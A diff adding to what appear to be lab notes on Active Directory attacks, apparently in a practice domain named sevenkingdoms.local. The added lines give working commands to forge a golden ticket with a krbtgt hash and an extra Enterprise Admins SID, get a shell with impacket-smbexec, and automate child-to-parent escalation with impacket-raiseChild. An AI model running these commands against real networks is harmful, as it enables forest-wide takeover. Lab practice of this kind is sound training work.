@@ -23,3 +23,26 @@ Get-ADGroup  -Server SEVENKINGDOMS.LOCAL  "Enterprise Admins"
 ```
 
 Then we can use `tickter.py` to make a golden ticket
+```bash
+ticketer.py -nthash 60d3803405f9c6f1c4f2ab08a0c18da0 -domain north.sevenkingdoms.local -domain-sid S-1-5-21-3276181164-781382281-1178861266 -extra-sid S-1-5-21-2540969834-2161428906-2182590186-519 hacker
+```
+-nthash is for krbtgt hash
+
+
+export it
+```bash
+export KRB5CCNAME=hacker.ccache
+```
+
+use it
+```bash
+impacket-smbexec -k -no-pass @kingslanding
+```
+
+### automate the whole process
+```bash
+impacket-raiseChild -hashes "aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4" north.sevenkingdoms.local/Administrator -target-exec 192.168.56.10
+
+```
+
+---
